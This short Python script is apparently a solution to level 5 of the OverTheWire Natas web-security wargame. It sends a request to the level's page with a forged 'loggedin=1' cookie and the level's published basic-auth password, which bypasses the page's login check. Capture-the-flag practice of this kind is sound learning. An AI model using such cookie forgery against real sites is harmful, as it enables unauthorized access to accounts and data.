import requests

cookies = {
    'loggedin': '1',
}

response = requests.get(
    'https://natas5.natas.labs.overthewire.org',
    cookies=cookies,
    auth=('natas5', 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'),
)

print(response.text)
